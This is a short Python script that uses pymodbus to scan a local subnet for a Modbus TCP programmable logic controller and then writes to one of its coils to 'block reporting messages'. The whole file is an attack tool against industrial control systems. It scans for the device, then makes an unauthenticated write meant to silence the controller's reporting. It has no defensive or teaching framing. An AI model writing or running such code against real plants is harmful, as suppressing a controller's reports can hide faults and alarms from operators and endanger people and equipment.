from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException
import socket
import time

def find_plc_ip(network_prefix, start_ip, end_ip):
    """
    Scan the network to find the PLC's IP address.
    :param network_prefix: The network prefix (e.g., '192.168.1.')
    :param start_ip: The starting IP address to scan (e.g., 1)
    :param end_ip: The ending IP address to scan (e.g., 254)
    :return: The IP address of the PLC if found, otherwise None
    """
    for i in range(start_ip, end_ip + 1):
        ip = network_prefix + str(i)
        try:
            client = ModbusTcpClient(ip, timeout=1)
            if client.connect():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except ModbusIOException:
            continue
    print("PLC not found in the specified range.")
    return None

def block_reporting_messages(plc_ip):
    """
    Block reporting messages by disabling communication or modifying the PLC's configuration.
    :param plc_ip: The IP address of the PLC
    """
    try:
        client = ModbusTcpClient(plc_ip)
        if client.connect():
            # Example: Disable a specific register or coil that is responsible for reporting
            # This is a placeholder; the actual implementation depends on the PLC's configuration
            client.write_coil(0, False)  # Disable the first coil (example)
            print("Reporting messages blocked.")
        else:
            print("Failed to connect to the PLC.")
    except ModbusIOException as e:
        print(f"Modbus error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    network_prefix = "192.168.1."
    start_ip = 1
    end_ip = 254

    plc_ip = find_plc_ip(network_prefix, start_ip, end_ip)
    if plc_ip:
        block_reporting_messages(plc_ip)
    else:
        print("PLC IP address not found.")